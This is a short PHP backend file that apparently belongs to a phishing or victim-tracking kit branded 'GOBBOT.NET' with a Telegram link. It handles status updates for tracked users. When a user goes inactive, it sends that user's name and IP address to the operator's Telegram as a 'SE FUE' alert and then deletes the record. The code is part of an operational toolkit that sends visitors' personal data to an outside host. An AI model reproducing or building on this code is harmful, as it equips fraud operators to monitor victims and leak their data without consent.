<?php
/**
###############################################
#    𝗚𝗢𝗕𝗕𝗢𝗧.𝗡𝗘𝗧 🏴‍☠️ https://t.me/fatgov      #
###############################################
**/
require "../../../config.php";
require "run.php";
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username'], $_POST['status'])) {
    $username = $_POST['username'];
    $status = $_POST['status'];
    
    if ($status === 'inactive') {
        $data = loadDatabase();
        if (isset($data['users'][$username])) {
            $userIP = $data['users'][$username]['ip'];
            $message = "🚨 <code>$username</code> :: <code>$userIP</code> SE FUE 🚨";
            sendMessageToTelegram($message);
            unset($data['users'][$username]);
            saveDatabase($data);
        }
    } elseif ($status === 'active') {
        updateUserStatus($username, 'active');
    }
}
?>
